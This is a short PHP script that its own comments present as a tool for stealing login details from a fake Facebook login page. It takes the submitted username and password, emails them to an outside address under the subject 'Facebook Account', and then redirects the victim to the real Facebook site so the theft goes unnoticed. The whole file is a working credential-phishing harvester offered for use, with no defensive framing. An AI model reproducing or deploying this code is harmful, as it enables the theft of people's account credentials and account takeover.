<?php 

/*

This is BASIC SendMail script written in PHP.
Script is used for stealing user information via POST method in LOGIN process.

*/

 // Getting user input
 // Web Applications have username and password fields, here it is!
 $username = $_REQUEST['tusername'] ;
 $password = $_REQUEST['tpassword'] ;
 
 // Where to send collected data
 $to = "mail@gmail.com" ; 
 $subject = "Facebook Account"; 
 $body =" Username: $username & Password: $password " ;
 
 // Send email to The Hacker
 mail($to, $subject, $body);
 
 // Redirect user to login URL
 
 /*

NOTE:
There is no any login check so if user enter wrong login information,
he/she will be redirected to normal login page - Master Domain. Ex: www.facebook.com
I will make advance login check in next version

*/
 header( "Location: http://www.facebook.com" );
 
 ?>